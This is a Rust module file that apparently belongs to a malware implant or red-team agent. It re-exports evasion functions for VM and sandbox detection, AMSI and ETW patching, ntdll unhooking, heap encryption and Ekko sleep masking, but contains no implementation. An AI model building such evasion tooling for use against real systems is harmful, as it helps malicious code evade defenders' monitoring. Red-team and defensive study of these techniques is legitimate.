// src/agent/evasion/mod.rs
//
// Evasion module — split from the original monolithic evasion.rs.
//
// Submodule layout:
//   detection  — VM/sandbox checks, decoy exit, parent-process validation
//   patching   — AMSI/ETW patching, ntdll .text unhooking
//   heap       — thread suspension, XOR + AES-256-GCM heap encryption
//   sleep      — fiber stack spoof, PE self-location, Ekko sleep mask
//
// All public symbols are re-exported here so every existing call-site of
// the form `crate::agent::evasion::foo()` continues to compile unchanged.

pub mod detection;
pub mod heap;
pub mod patching;
pub mod sleep;

// ── detection ─────────────────────────────────────────────────────────
pub use detection::{is_bad_parent, is_virtualized, run_decoy};

// ── patching ──────────────────────────────────────────────────────────
pub use patching::{patch_amsi, patch_etw, unhook_ntdll};

// ── heap ──────────────────────────────────────────────────────────────
pub use heap::{
    decrypt_heap, decrypt_heap_aes256gcm,
    encrypt_heap, encrypt_heap_aes256gcm,
    resume_threads, suspend_other_threads,
};

// ── sleep ─────────────────────────────────────────────────────────────
pub use sleep::{agent_text_section, ekko_sleep, sleep_with_spoofed_stack};
